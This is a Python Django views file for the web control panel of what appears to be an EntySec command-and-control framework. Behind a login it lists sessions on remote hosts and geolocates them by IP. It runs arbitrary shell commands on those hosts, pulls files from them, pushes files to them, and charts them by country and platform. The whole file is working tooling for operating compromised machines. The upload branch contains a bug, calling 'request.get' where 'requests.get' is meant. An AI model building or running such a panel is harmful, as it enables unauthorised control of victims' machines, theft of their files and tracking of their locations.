#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from django.views import View
from django.shortcuts import render

from django.http import HttpResponseRedirect, JsonResponse, HttpResponse
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin

from .models import Session
from geopy.geocoders import Nominatim

import time
import ipaddress
import json
import requests


class Utils:
    api = 'http://127.0.0.1:8008'
    closed = 0
    version = '1.0.0'
    start = time.time()

    def get_uptime(self):
        return time.time() - self.start

    def check_connected(self):
        try:
            requests.get(self.api)
        except Exception:
            return False
        return True

    def get_sessions(self, locate=False):
        try:
            sessions = requests.get(f"{self.api}/sessions?list=all").json()
        except Exception:
            sessions = dict()

        for session_id in sessions.keys():
            if not Session.objects.filter(session_id=session_id).exists():
                latitude, longitude = 0, 0

                if locate:
                    try:
                        if ipaddress.ip_address(sessions[session_id]['host']).is_private:
                            data = requests.get(
                                "https://myexternalip.com/json"
                            ).json()
                            host = data['ip']
                        else:
                            host = sessions[session_id]['host']

                        data = requests.get(
                            f"http://ipinfo.io/{host}"
                        ).json()['loc'].split(',')

                        latitude = data[0]
                        longitude = data[1]
                    except Exception:
                        pass

                    address = ""
                    country = Nominatim(user_agent="nil").reverse(
                        f'{latitude},{longitude}',
                        language='en'
                    ).raw['address']

                    for field in country:
                        if field != 'country':
                            address += country[field] + " "

                    address = address[:-1]
                    if 'country' in country:
                        country = country['country']
                    else:
                        country = ''

                    if not country:
                        country = "Unknown"

                    if not address:
                        address = "Unknown"

                else:
                    address, country = "Unknown", "Unknown"

                platform = sessions[session_id]['platform']
                if platform == 'macos':
                    platform = '<i class="fa fa-apple"></i>&nbsp;&nbsp; macOS'
                elif platform == 'iphoneos':
                    platform = '<i class="fa fa-apple"></i>&nbsp;&nbsp; iPhoneOS'
                elif platform == 'android':
                    platform = '<i class="fa fa-android"></i>&nbsp;&nbsp; Android'
                elif platform == 'windows':
                    platform = '<i class="fa fa-windows"></i>&nbsp;&nbsp; Windows'
                elif platform == 'linux':
                    platform = '<i class="fa fa-linux"></i>&nbsp;&nbsp; Linux'
                elif platform == 'unix':
                    platform = '<i class="fa fa-linux"></i>&nbsp;&nbsp; Unix'
                else:
                    platform = f'<i class="fa fa-question"></i>&nbsp;&nbsp; {platform}'

                Session.objects.create(
                    session_id=session_id,
                    platform=platform,
                    type=sessions[session_id]['type'],
                    host=sessions[session_id]['host'],
                    port=sessions[session_id]['port'],
                    latitude=latitude,
                    longitude=longitude,
                    country=country,
                    address=address
                )

        for session in Session.objects.all():
            if str(session.session_id) not in sessions.keys():
                self.closed += 1
                Session.objects.filter(session_id=session.session_id).delete()

        sessions = Session.objects.all()
        return sessions


utils = Utils()


class Attack(LoginRequiredMixin, View):
    template = 'attack.html'
    login_url = '/login/'

    def post(self, request):
        if 'session' in request.POST:
            session = request.POST['session']

            if session:
                if 'local_file' not in request.POST:
                    remote_file = request.POST['remote_file']
                    local_path = request.POST['local_path']

                    if remote_file and local_path:
                        requests.get(f"{utils.api}/sessions?download={remote_file}&path={local_path}&id={session}")
                else:
                    local_file = request.POST['local_file']
                    remote_path = request.POST['remote_path']

                    if local_file and remote_path:
                        request.get(f"{utils.api}/sessions?upload={local_file}&path={remote_path}&id={session}")

        return render(request, self.template, {
            'connected': utils.check_connected(),
            'sessions': utils.get_sessions()
        })

    def get(self, request):
        return render(request, self.template, {
            'connected': utils.check_connected(),
            'sessions': utils.get_sessions()
        })


class Lookup(LoginRequiredMixin, View):
    template = 'lookup.html'
    login_url = '/login/'

    def get(self, request):
        locations = []
        sessions = utils.get_sessions(locate=True)

        for session in sessions:
            location = [session.country, 0]
            if location not in locations:
                locations.append(location)

        for session in sessions:
            for i in range(0, len(locations)):
                if session.country == locations[i][0]:
                    locations[i][1] += 1

        return render(request, self.template, {
            'locations': locations,
            'sessions': sessions,
            'connected': utils.check_connected(),
        })


class Map(LoginRequiredMixin, View):
    template = 'map.html'
    login_url = '/login/'

    def get(self, request):
        locations = []
        sessions = utils.get_sessions(locate=True)

        for session in sessions:
            location = [session.country, 0]
            if location not in locations:
                locations.append(location)

        for session in sessions:
            for i in range(0, len(locations)):
                if session.country == locations[i][0]:
                    locations[i][1] += 1

        return render(request, self.template, {
            'locations': locations,
            'connected': utils.check_connected(),
        })


class Index(LoginRequiredMixin, View):
    template = 'index.html'
    login_url = '/login/'

    def get(self, request):
        return render(request, self.template, {
            'connected': utils.check_connected(),
            'uptime': utils.get_uptime(),
            'version': utils.version
        })


class Control(LoginRequiredMixin, View):
    template = 'control.html'
    login_url = '/login/'

    def post(self, request):
        output = ""

        if 'session' in request.POST:
            session = request.POST['session']

            if session:
                if 'command' not in request.POST:
                    requests.get(f"{utils.api}/sessions?close={session}")
                else:
                    command = request.POST['command']

                    if command:
                        output = requests.get(
                            f"{utils.api}/sessions?command={command}&output=yes&id={session}"
                        ).text

                        output = '<pre>' + output.replace('"', '') + '</pre>'
                        output = output.replace('\\n', '<br>')

        return render(request, self.template, {
            'connected': utils.check_connected(),
            'sessions': utils.get_sessions(),
            'output': output
        })

    def get(self, request):
        return render(request, self.template, {
            'connected': utils.check_connected(),
            'sessions': utils.get_sessions(),
            'output': ""
        })


class Dashboard(LoginRequiredMixin, View):
    template = 'dashboard.html'
    login_url = '/login/'

    def post(self, request):
        output = ""

        if 'session' in request.POST and 'command' in request.POST:
            session = request.POST['session']
            command = request.POST['command']

            output = requests.get(
                f"{utils.api}/sessions?command={command}&output=yes&id={session}"
            ).text

            output = '<pre>' + output.replace('"', '') + '</pre>'
            output = output.replace("\\n", '<br>')

        return HttpResponse(json.dumps({'output': output}))

    def get(self, request):
        platforms = []
        locations = []

        try:
            opened_sessions = int(requests.get(f"{utils.api}/sessions?count=all").text)
        except Exception:
            opened_sessions = 0

        sessions = utils.get_sessions(locate=True)

        for session in sessions:
            platform = session.platform[session.platform.find('; ')+2:]
            platform = [platform, int(
                requests.get(f"{utils.api}/sessions?count={platform.lower()}").text
            )]

            if platform not in platforms:
                platforms.append(platform)

            location = [session.country, 0]
            if location not in locations:
                locations.append(location)

        for session in sessions:
            for i in range(0, len(locations)):
                if session.country == locations[i][0]:
                    locations[i][1] += 1

        return render(request, self.template, {
            'connected': utils.check_connected(),
            'sessions': sessions,
            'platforms': platforms,

            'opened_sessions': opened_sessions,
            'closed_sessions': utils.closed,

            'top_platforms': len(platforms),
            'top_locations': len(locations),
            'locations': locations
        })


class Login(View):
    template = 'login.html'

    def get(self, request):
        form = AuthenticationForm()
        return render(request, self.template, {'form': form})

    def post(self, request):
        form = AuthenticationForm(request.POST)
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return HttpResponseRedirect('/')
        else:
            return render(request, self.template, {'form': form})
